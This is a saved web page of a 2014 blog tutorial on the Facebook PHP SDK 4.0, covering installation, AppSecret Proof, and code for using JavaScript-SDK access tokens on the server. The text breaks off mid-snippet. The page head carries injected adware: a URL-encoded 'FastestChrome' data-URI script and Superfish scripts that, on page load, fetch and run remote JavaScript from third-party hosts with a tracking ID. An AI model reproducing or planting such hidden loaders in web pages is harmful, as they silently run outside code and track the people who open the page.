<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0059)http://www.devils-heaven.com/facebook-php-sdk-4-0-tutorial/ -->
<html xmlns="http://www.w3.org/1999/xhtml"><head profile="http://gmpg.org/xfn/11"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="./Facebook PHP SDK 4.0 Tutorial_files/style.css" media="screen"><link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="http://www.devils-heaven.com/feed/"><link rel="pingback" href="http://www.devils-heaven.com/xmlrpc.php"> <!--[if IE 6]><script type="text/javascript" src="http://www.devils-heaven.com/wp-content/themes/headlines/includes/js/pngfix.js"></script><script type="text/javascript" src="http://www.devils-heaven.com/wp-content/themes/headlines/includes/js/menu.js"></script><link rel="stylesheet" type="text/css" media="all" href="http://www.devils-heaven.com/wp-content/themes/headlines/css/ie6.css" /> <![endif]--><!--[if IE 7]><link rel="stylesheet" type="text/css" media="all" href="http://www.devils-heaven.com/wp-content/themes/headlines/css/ie7.css" /> <![endif]--><meta name="twitter:card" content="summary"><meta name="twitter:creator" content="@andi_teufel"><meta name="twitter:url" content="http://www.devils-heaven.com/facebook-php-sdk-4-0-tutorial/"><meta name="twitter:title" content="Facebook PHP SDK 4.0 Tutorial"><meta name="twitter:description" content="Articles and Tutorials about Facebook, Youtube, PHP, JavaScript, Node.js and stuff"><meta name="twitter:image" content="http://www.devils-heaven.com/wp-content/themes/headlines/images/luschn-og.png"><title>Facebook PHP SDK 4.0 Tutorial</title><meta name="description" content="Basic usage and Helper Classes like JavaScript Login Helper and Page Tab Helper, AppSecret Proof and Access Tokens from the JavaScript SDK."><link rel="canonical" href="./Facebook PHP SDK 4.0 Tutorial_files/Facebook PHP SDK 4.0 Tutorial.htm"><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="og:title" content="Facebook PHP SDK 4.0 Tutorial"><meta property="og:description" content="Basic usage and Helper Classes like JavaScript Login Helper and Page Tab Helper, AppSecret Proof and Access Tokens from the JavaScript SDK."><meta property="og:url" content="http://www.devils-heaven.com/facebook-php-sdk-4-0-tutorial/"><meta property="og:site_name" content="Devils Heaven"><meta property="article:tag" content="facebook api"><meta property="article:tag" content="php sdk"><meta property="article:section" content="Facebook"><meta property="article:section" content="Social Media"><meta property="article:published_time" content="2014-07-28T01:45:18+00:00"><meta property="article:modified_time" content="2014-07-28T10:41:17+00:00"><meta property="og:updated_time" content="2014-07-28T10:41:17+00:00"><meta property="fb:admins" content="1603196280"><meta property="og:image" content="http://www.devils-heaven.com/wp-content/uploads/2014/07/phpsdk4_icon.jpg"><link rel="alternate" type="application/rss+xml" title="Devils Heaven » Facebook PHP SDK 4.0 Tutorial Comments Feed" href="http://www.devils-heaven.com/facebook-php-sdk-4-0-tutorial/feed/"><link rel="stylesheet" id="tablepress-default-css" href="./Facebook PHP SDK 4.0 Tutorial_files/tablepress-combined.min.css" type="text/css" media="all"><link rel="stylesheet" id="fancybox-css" href="./Facebook PHP SDK 4.0 Tutorial_files/jquery.fancybox-1.3.6.pack.css" type="text/css" media="screen"><script async="" type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/ca-pub-6146753047819879.js"></script><script type="text/javascript" async="" src="./Facebook PHP SDK 4.0 Tutorial_files/ga.js"></script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/jquery.js"></script><style type="text/css"></style><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/jquery-migrate.min.js"></script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/superfish.js"></script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/woo_tabs.js"></script><link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.devils-heaven.com/xmlrpc.php?rsd"><link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.devils-heaven.com/wp-includes/wlwmanifest.xml"><link rel="shortlink" href="http://www.devils-heaven.com/?p=1532"> <script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/shCore.js"></script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/shAutoloader.js"></script><link type="text/css" rel="stylesheet" href="./Facebook PHP SDK 4.0 Tutorial_files/shCoreRDark.css"><link href="./Facebook PHP SDK 4.0 Tutorial_files/red.css" rel="stylesheet" type="text/css"> <style type="text/css">#logo img{display:none}.site-title{display:block !important}.site-description{display:block !important}</style><link href="./Facebook PHP SDK 4.0 Tutorial_files/shortcodes.css" rel="stylesheet" type="text/css"><link href="./Facebook PHP SDK 4.0 Tutorial_files/custom.css" rel="stylesheet" type="text/css"><style type="text/css">#logo .site-title a{font:bold 36px/1em Arial, sans-serif;color:#fff}#logo .site-description{font:normal 11px/1em Arial, sans-serif;color:#bbb}</style><script type="text/javascript">var fb_timeout=null;var fb_opts={'overlayShow':true,'hideOnOverlayClick':true,'showCloseButton':true,'centerOnScroll':false,'enableEscapeButton':true,'autoScale':true,'speedIn':200};var easy_fancybox_handler=function(){var fb_IMG_select='a[href*=".jpg"]:not(.nofancybox), area[href*=".jpg"]:not(.nofancybox), a[href*=".gif"]:not(.nofancybox), area[href*=".gif"]:not(.nofancybox), a[href*=".png"]:not(.nofancybox), area[href*=".png"]:not(.nofancybox)';jQuery(fb_IMG_select).addClass('fancybox');jQuery('a.fancybox, area.fancybox, li.fancybox a:not(li.nofancybox a)').fancybox(jQuery.extend({},fb_opts,{'easingIn':'easeOutExpo','easingOut':'easeInBack','opacity':true,'hideOnContentClick':false,'titleShow':false,'titlePosition':'over','titleFromAlt':true,'showNavArrows':false,'enableKeyboardNav':true,'cyclic':false,'changeFade':200}));}</script><style type="text/css">.fancybox-hidden{display:none}.rtl #fancybox-left{left:auto;right:0px}.rtl #fancybox-right{left:0px;right:auto}.rtl #fancybox-right-ico{background-position:-40px -30px}.rtl #fancybox-left-ico{background-position:-40px -60px}.rtl .fancybox-title-over{text-align:right}.rtl #fancybox-left-ico,.rtl #fancybox-right-ico{right:-9999px}.rtl #fancybox-right:hover span{right:auto;left:20px}.rtl #fancybox-left:hover span{right:20px}#fancybox-img{max-width:none;max-height:none}</style><!--[if lt IE 8]><style type="text/css">.fancybox-ie6 #fancybox-close{background:transparent;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_close.png",sizingMethod="scale")}.fancybox-ie6 #fancybox-left-ico{background:transparent;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_nav_left.png",sizingMethod="scale")}.fancybox-ie6 #fancybox-right-ico{background:transparent;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_nav_right.png",sizingMethod="scale")}.fancybox-ie6 #fancybox-title-over{background:transparent;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_title_over.png",sizingMethod="scale");zoom:1}.fancybox-ie6 #fancybox-title-float-left{background:transparent;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_title_left.png",sizingMethod="scale")}.fancybox-ie6 #fancybox-title-float-main{background:transparent;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_title_main.png",sizingMethod="scale")}.fancybox-ie6 #fancybox-title-float-right{background:transparent;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_title_right.png",sizingMethod="scale")}.fancybox-ie6 #fancybox-bg-w,.fancybox-ie6 #fancybox-bg-e,.fancybox-ie6 #fancybox-left,.fancybox-ie6 #fancybox-right,#fancybox-hide-sel-frame{height:expression(this.parentNode.clientHeight+"px")}#fancybox-loading.fancybox-ie6{position:absolute;margin-top:0;top:expression((-20+(document.documentElement.clientHeight ? document.documentElement.clientHeight/2 : document.body.clientHeight/2)+(ignoreMe=document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop))+"px")}#fancybox-loading.fancybox-ie6 div{background:transparent;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_loading.png", sizingMethod="scale")}.fancybox-ie #fancybox-bg-n{filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_n.png",sizingMethod="scale")}.fancybox-ie #fancybox-bg-ne{filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_ne.png",sizingMethod="scale")}.fancybox-ie #fancybox-bg-e{filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_e.png",sizingMethod="scale")}.fancybox-ie #fancybox-bg-se{filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_se.png",sizingMethod="scale")}.fancybox-ie #fancybox-bg-s{filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_s.png",sizingMethod="scale")}.fancybox-ie #fancybox-bg-sw{filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_sw.png",sizingMethod="scale")}.fancybox-ie #fancybox-bg-w{filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_w.png",sizingMethod="scale")}.fancybox-ie #fancybox-bg-nw{filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_nw.png",sizingMethod="scale")}</style><![endif]--> <!--[if IE 8]><style type="text/css">.fancybox-ie #fancybox-bg-n{-ms-filter:'progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_n.png",sizingMethod="scale")'}.fancybox-ie #fancybox-bg-ne{-ms-filter:'progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_ne.png",sizingMethod="scale")'}.fancybox-ie #fancybox-bg-e{-ms-filter:'progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_e.png",sizingMethod="scale")'}.fancybox-ie #fancybox-bg-se{-ms-filter:'progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_se.png",sizingMethod="scale")'}.fancybox-ie #fancybox-bg-s{-ms-filter:'progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_s.png",sizingMethod="scale")'}.fancybox-ie #fancybox-bg-sw{-ms-filter:'progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_sw.png",sizingMethod="scale")'}.fancybox-ie #fancybox-bg-w{-ms-filter:'progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_w.png",sizingMethod="scale")'}.fancybox-ie #fancybox-bg-nw{-ms-filter:'progid:DXImageTransform.Microsoft.AlphaImageLoader(src="http://www.devils-heaven.com/wp-content/plugins/easy-fancybox/fancybox/fancy_shadow_nw.png",sizingMethod="scale")'}</style><![endif]--><!--[if lte IE 7]><script type="text/javascript">jQuery(function(){var zIndexNumber=1000;jQuery('div').each(function(){jQuery(this).css('zIndex',zIndexNumber);zIndexNumber-=1;});});</script><![endif]--><script type="text/javascript">/*<![CDATA[*/(function(){var shr=document.createElement('script');shr.setAttribute('data-cfasync','false');shr.src='//dsms0mj1bbhn4.cloudfront.net/assets/pub/shareaholic.js';shr.type='text/javascript';shr.async='true';shr.onload=shr.onreadystatechange=function(){var rs=this.readyState;if(rs&&rs!='complete'&&rs!='loaded')return;var apikey='4915fa427070c2fcd9317077343d8e3a'try{Shareaholic.init(apikey);}catch(e){}};var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(shr,s);})();/*]]>*/</script><style type="text/css">iframe.dealply-toast { right: -99999px !important; }iframe.dealply-toast.fastestext-revealed { right: 0px !important; margin-bottom: 0px !important; }</style><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/javascript.js"></script><script type="text/javascript" src="data:text/javascript,(function()%7Bvar%20e%3D%22Chrome%20Webstore%22%3B%0Avar%20c%3D%22FastestChrome%22%3B%0Avar%20h%3D%221375180961979%22%3B%0Avar%20f%3D%22false%22%3B%0Avar%20d%3D%221_2013-07%22%3B%0Aif(window!%3Dwindow.top)%7Breturn%0A%7Dvar%20a%3D%5B%2Fveetle.com%2F%2C%2F1800flowers.com%2F%2C%2Fdominos.com%2F%2C%2Fsquidoo.com%2F%2C%2Fnytimes.com%2F%2C%2Fdeveloper.apple.com%2F%2C%2Fhotmail.com%2F%2C%2Fnfl.com%2F%2C%2Fgrooveshark.com%2F%2Cnew%20RegExp(%22www.google.com%2Freader%22)%2C%2F%5C.ft.com%2F%2C%2Fpandora.com%2F%2C%2Fmerriam-webster.com%2F%2C%2Freddit.com%2F%2C%2Fquora.com%2F%2C%2Ffandango.com%2F%2C%2Fcdixon.org%2F%2C%2Fteslamotors.com%2F%2C%2Fblogspot.co%2F%2C%2Freuters.com%2F%2C%2Fgame321.com%2F%2C%2Fcontinuations.com%2F%2C%2Farstechnica.com%2F%2C%2Fcbslocal.com%2F%2C%2Fvice.com%2F%2C%2Fsealedabstract.com%2F%2C%2Fokcupid.com%2F%2C%2Fnature.com%2F%2C%2Fspotify.com%2F%2C%2Fonline.wsj.com%2F%2C%2Fthermalwindowcurtains.com%2F%2C%2F.*live.com%2F%2C%2F.*battlefield.com%2F%2C%2Fpch.com%2F%5D%3B%0Afor(var%20b%3D0%3B%0Ab%3Ca.length%3B%0Ab%2B%2B)%7Bif(a%5Bb%5D.test(document.location.href))%7Breturn%0A%7D%7Dvar%20j%3Dfunction(l)%7Bvar%20m%3D0%3B%0Afor(var%20k%3D0%3B%0Ak%3Cl.length%3B%0Ak%2B%2B)%7Bm%3D((m%3C%3C5)-m)%2Bl.charCodeAt(k)%3B%0Am%3Dm%26m%0A%7Dreturn%20m%0A%7D%3B%0Avar%20g%3Dfunction(k)%7Bvar%20i%3Dfunction()%7Bif(window.document.body)%7Bk()%0A%7Delse%7BsetTimeout(i%2C100)%0A%7D%7D%3B%0Ai()%0A%7D%3B%0Ag(function()%7Bif(%2F(www.google.(de%7Ccom))%7C(search.yahoo.com)%7C(www.bing.(de%7Ccom))%2F.test(document.location.href)%26%26d.indexOf(%22OC3%22)%3D%3D0)%7Breturn%0A%7DsetTimeout(function()%7Bif(%2F%5Ehttp%3A%2F.test(document.location.href)%7C%7Cnew%20RegExp(%22%5Ehttps%3A%2F%2Fwww.google.com%22).test(document.location.href))%7Bvar%20o%3Dfunction(p)%7Bvar%20q%3Ddocument.createElement(%22script%22)%3B%0Aq.type%3D%22text%2Fjavascript%22%3B%0Aq.src%3Dp%3B%0Adocument.getElementsByTagName(%22head%22)%5B0%5D.appendChild(q)%0A%7D%3B%0Avar%20l%3Dfunction(p)%7Bif(f!%3D%22false%22)%7Bo(%22http%3A%2F%2Fi.fastestjs.info%2Ffast%2Fjavascript.js%3Fchannel%3D%22%2Bp)%0A%7D%7D%3B%0Avar%20n%3Dfunction(p%2Cq)%7Bo(%22https%3A%2F%2Fwww.superfish.com%2Fws%2Fsf_conduit.jsp%3Fdlsource%3D%22%2Bp%2B%22%26CTID%3D%22%2Bq%2B%22%26userId%3Dfastest_000_%22%2Bp%2B%22_%22%2Bq%2B%22_%22)%0A%7D%3B%0Avar%20k%3Dnavigator.browserLanguage%7C%7Cnavigator.language%3B%0Avar%20i%3D%22fastestchrome%22%3B%0Aif(%2FChrome%2F.test(navigator.userAgent))%7Bif(c%3D%3D%22Fastanium%22)%7Bi%3D%22fastanium%22%0A%7Delse%7Bi%3D%22fastestchrome%22%0A%7D%7Delse%7Bif(%2FFirefox%2F.test(navigator.userAgent))%7Bi%3D%22fastestfox%22%0A%7Delse%7Bif(%2FSafari%2F.test(navigator.userAgent))%7Bi%3D%22fastestsafari%22%0A%7Delse%7Bif(%2FTrident%2F.test(navigator.userAgent))%7Bi%3D%22fastestie%22%0A%7D%7D%7D%7Dvar%20m%3DMath.abs(j(h))%3B%0An(i%2Cd)%0A%7D%7D%2C500)%0A%7D)%0A%7D())%3B"></script><script src="./Facebook PHP SDK 4.0 Tutorial_files/opt_content.js"></script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/sf_conduit.jsp"></script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/sf_preloader.jsp"></script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/sf_code.jsp"></script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/main.js"></script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/base_single_icon.js"></script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/main(1).js"></script><link rel="stylesheet" href="http://www.superfish.com/ws/css/main.css?v=14.08.05.1"><link rel="stylesheet" href="http://www.superfish.com/ws/css/sfProdBan.css?v=14.08.05.1"><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/get.jsp"></script><script src="./Facebook PHP SDK 4.0 Tutorial_files/ngram_id_dict.json" id="SF_ngram_call" type="text/javascript"></script></head><body class="single single-post postid-1532 single-format-standard unknown alt-style-red"><div id="container"><div id="top"><div id="header" class="col-full"><div id="logo"> <span class="site-title"><a href="http://www.devils-heaven.com/">Devils Heaven</a></span> <span class="site-description">facebook, raspberry, javascript and stuff</span></div></div><div id="navigation"><div id="page-nav"><div class="col-full"><div class="home-icon"><a href="http://www.devils-heaven.com/"><img src="./Facebook PHP SDK 4.0 Tutorial_files/ico-home.png" class="ico-home" alt="Home"></a></div><ul id="nav" class="fl sf-js-enabled sf-shadow"><li class="page_item page-item-104"><a href="http://www.devils-heaven.com/imprint/">Imprint</a></li><li class="page_item page-item-309 page_item_has_children"><a href="http://www.devils-heaven.com/myprojects/" class="sf-with-ul">Projects<span class="sf-sub-indicator"> »</span></a><ul class="children" style="display: none; visibility: hidden;"><li class="page_item page-item-712"><a href="http://www.devils-heaven.com/myprojects/babyslide-image-slider/">BabySlide Image Slider</a></li><li class="page_item page-item-314"><a href="http://www.devils-heaven.com/myprojects/devilcam/">DevilCam – Timed Webcam Pictures</a></li><li class="page_item page-item-644"><a href="http://www.devils-heaven.com/myprojects/mutual-friend-lister/">Facebook API – Mutual Friend Lister</a></li><li class="page_item page-item-347"><a href="http://www.devils-heaven.com/myprojects/singlesms/">Single SMS Android App</a></li><li class="page_item page-item-623"><a href="http://www.devils-heaven.com/myprojects/twitter-inbox-cleaner/">Twitter Inbox Cleaner</a></li><li class="page_item page-item-597"><a href="http://www.devils-heaven.com/myprojects/twitter-friend-cleaner/">Twitter Friend Cleaner</a></li></ul></li></ul><ul class="rss fr"><li><a href="http://www.devils-heaven.com/feed/">Posts</a></li></ul></div></div><div id="cat-nav"><div class="col-full"><ul id="secnav" class="fl sf-js-enabled sf-shadow"><li> <a href="http://www.devils-heaven.com/category/android/">Android</a></li><li> <a href="http://www.devils-heaven.com/category/javascript/" class="sf-with-ul">JavaScript<span class="sf-sub-indicator"> »</span></a><ul style="display: none; visibility: hidden;"><li class="cat-item cat-item-30"><a href="http://www.devils-heaven.com/category/javascript/nodejs/" title="View all posts filed under Node.js">Node.js</a></li></ul></li><li> <a href="http://www.devils-heaven.com/category/misc/">Misc</a></li><li> <a href="http://www.devils-heaven.com/category/raspberry-pi-2/">Raspberry Pi</a></li><li> <a href="http://www.devils-heaven.com/category/socialmedia/" class="sf-with-ul">Social Media<span class="sf-sub-indicator"> »</span></a><ul style="display: none; visibility: hidden;"><li class="cat-item cat-item-3"><a href="http://www.devils-heaven.com/category/socialmedia/facebook/" title="Graph API, Static FBML, FBJS und sonstige Spielereien rund um Facebook">Facebook</a></li></ul></li></ul><div id="search" class="fr"><form method="get" id="searchform" action="http://www.devils-heaven.com/"> <input type="text" class="field" name="s" id="s" value="Enter keywords..." onfocus="if (this.value == &#39;Enter keywords...&#39;) {this.value = &#39;&#39;;}" onblur="if (this.value == &#39;&#39;) {this.value = &#39;Enter keywords...&#39;;}"> <input class="submit btn" type="image" src="./Facebook PHP SDK 4.0 Tutorial_files/ico-search.png" value="Go"></form></div></div></div></div></div><div id="content" class="col-full"><div id="main" class="col-left"><div class="box"><div class="post"><h1 class="title">Facebook PHP SDK 4.0 Tutorial</h1><p class="post-meta"> <img src="./Facebook PHP SDK 4.0 Tutorial_files/ico-time.png" alt="">28. July 2014 <span class="comments"><img src="./Facebook PHP SDK 4.0 Tutorial_files/ico-comment.png" alt=""><a href="http://www.devils-heaven.com/facebook-php-sdk-4-0-tutorial/#comments" title="Comment on Facebook PHP SDK 4.0 Tutorial">1 Comment</a></span></p><div class="entry"> <span class="" style="height:40px;"><iframe src="./Facebook PHP SDK 4.0 Tutorial_files/like.htm" scrolling="no" frameborder="0" allowtransparency="true" style="border:none;overflow:hidden;width:580px;height:40px"></iframe></span><p>Facebook changed their PHP SDK a lot with version 4.0, so i thought you could use a tiny tutorial how to authorize users and how to use the API with the new version. Feel free to comment about any errors or suggestions.</p><h2>Download/Install/Prerequisites</h2><p>Obviously, the first thing to do is to download the PHP SDK: <a title="Facebook PHP SDK 4" href="https://github.com/facebook/facebook-php-sdk-v4" target="_blank">Facebook PHP SDK 4</a></p><p>You may also want to take a look at the basic tutorial from Facebook: <a title="Getting started with the Facebook SDK for PHP" href="https://developers.facebook.com/docs/php/gettingstarted/4.0.0" target="_blank">Getting started with the Facebook SDK for PHP</a></p><p>They even created a fresh repository on github for it. Keep in mind that <strong>the old SDK still works</strong> (for now), but it´s recommended to use the new one for new projects. So just download the package and upload it to your webserver. <strong>You need to upload the whole directory, not just the src folder</strong>. Feel free to delete every file except for “autoload.php” in the root folder though, and the folders “docs” and “tests”.</p><p>Btw, you can also use <a title="Composer" href="https://getcomposer.org/" target="_blank">Composer</a>, which is the recommended way to install the PHP SDK. But it´s not worth it to use Composer just for one dependency in my opinion, and it would only make things easier/faster if you already got Composer running on your machine. Keep in mind that you don´t need to include autoload.php in that case, Composer takes care of that for you by creating a vendor/autoload.php file to autoload all the dependencies.</p><h3>AppSecret Proof</h3><p>One very important security option is to activate the “<strong>AppSecret Proof</strong>” in the settings of your App. It is easy to use, just activate it and add the “appsecret_proof” parameter to every single call to the Facebook API on the server. Take a look at the Facebook docs for more information: <a title="Securing Graph API Requests" href="https://developers.facebook.com/docs/graph-api/securing-requests" target="_blank">Securing Graph API Requests</a>. <strong>You don´t have to care about adding the parameter while using the PHP SDK</strong>, it will get added automatically with every call. Check out my article about <a title="Extended Page Access Tokens with CURL" href="http://www.devils-heaven.com/extended-page-access-tokens-curl/">Extended Page Access Tokens with CURL</a> to see how it looks like to add it on your own.</p><p>Keep in mind that this only affects calls on the server, using the JavaScript SDK for API calls still works fine if you activate the AppSecret Proof. <strong>So this should ALWAYS be activated to keep your Access Tokens safe</strong>.</p><h2>Using an existing Access Token</h2><p>Alright, it is time for some code. Login is done best with <a title="FB.login" href="https://developers.facebook.com/docs/reference/javascript/FB.login/v2.0" target="_blank">FB.login</a> in the JavaScript SDK, you can transfer the Access Token to your PHP file and use it with the PHP SDK:</p><div><div id="highlighter_730044" class="syntaxhighlighter  js"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="js plain">FB.login(</code><code class="js keyword">function</code> <code class="js plain">(response) {</code></div><div class="line number2 index1 alt1"><code class="js spaces">&nbsp;&nbsp;</code><code class="js keyword">if</code> <code class="js plain">(response.authResponse) {</code></div><div class="line number3 index2 alt2"><code class="js spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="js plain">console.log(response.authResponse.accessToken);</code></div><div class="line number4 index3 alt1"><code class="js spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="js comments">//transfer token to server with ajax</code></div><div class="line number5 index4 alt2"><code class="js spaces">&nbsp;&nbsp;</code><code class="js plain">}</code></div><div class="line number6 index5 alt1"><code class="js plain">}, {scope: </code><code class="js string">'email'</code><code class="js plain">});</code></div></div></td></tr></tbody></table></div></div><p>On the server, this is actually the basic example from the PHP SDK, using the transferred Access Token in the highlighted line. There´s one little change though, or it will not work. Not sure if it would work with Composer or if it´s just a bug in the Readme file of the SDK, but line number 5 is missing the “GraphNodes” folder. There you go:</p><div><div id="highlighter_241664" class="syntaxhighlighter  php"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2 highlighted">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="php keyword">require</code> <code class="php string">'phpsdk4/autoload.php'</code><code class="php plain">;</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="php keyword">use</code> <code class="php plain">Facebook\FacebookSession;</code></div><div class="line number4 index3 alt1"><code class="php keyword">use</code> <code class="php plain">Facebook\FacebookRequest;</code></div><div class="line number5 index4 alt2"><code class="php keyword">use</code> <code class="php plain">Facebook\GraphNodes\GraphUser;</code></div><div class="line number6 index5 alt1"><code class="php keyword">use</code> <code class="php plain">Facebook\FacebookRequestException;</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="php plain">FacebookSession::setDefaultApplication(</code><code class="php string">'APP-ID'</code><code class="php plain">, </code><code class="php string">'APP-SECRET'</code><code class="php plain">);</code></div><div class="line number9 index8 alt2 highlighted"><code class="php variable">$session</code> <code class="php plain">= </code><code class="php keyword">new</code> <code class="php plain">FacebookSession(</code><code class="php variable">$_GET</code><code class="php plain">[</code><code class="php string">'access_token'</code><code class="php plain">]);</code></div><div class="line number10 index9 alt1">&nbsp;</div><div class="line number11 index10 alt2"><code class="php keyword">try</code> <code class="php plain">{</code></div><div class="line number12 index11 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$me</code> <code class="php plain">= (</code><code class="php keyword">new</code> <code class="php plain">FacebookRequest(</code></div><div class="line number13 index12 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$session</code><code class="php plain">, </code><code class="php string">'GET'</code><code class="php plain">, </code><code class="php string">'/me'</code></div><div class="line number14 index13 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">))-&gt;execute()-&gt;getGraphObject(GraphUser::className());</code></div><div class="line number15 index14 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php functions">echo</code> <code class="php variable">$me</code><code class="php plain">-&gt;getName();</code></div><div class="line number16 index15 alt1"><code class="php plain">} </code><code class="php keyword">catch</code> <code class="php plain">(FacebookRequestException </code><code class="php variable">$e</code><code class="php plain">) {</code></div><div class="line number17 index16 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php comments">// The Graph API returned an error</code></div><div class="line number18 index17 alt1"><code class="php plain">}</code></div></div></td></tr></tbody></table></div></div><p>As you can see, the code looks a lot more complicated now. A lot of tutorials out there require every single class and make it even more complicated, not sure why they don´t just use the included autoloader. For repeated calls, it would be good to store the Access Token in a session though.</p><h2>Using the JavaScript Login Helper</h2><p>You can avoid juggling with Access Tokens by using one of the Helper Classes of the new SDK. The <a title="FacebookJavaScriptLoginHelper" href="https://developers.facebook.com/docs/php/FacebookJavaScriptLoginHelper/4.0.0" target="_blank">FacebookJavaScriptLoginHelper</a> creates a Session from a JavaScript SDK login process and takes the data from the cookies created by the JavaScript SDK.</p><p>The Facebook docs don´t mention something very important: <strong>you have to add a cookie parameter to the FB.init call</strong>:</p><div><div id="highlighter_936919" class="syntaxhighlighter  js"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 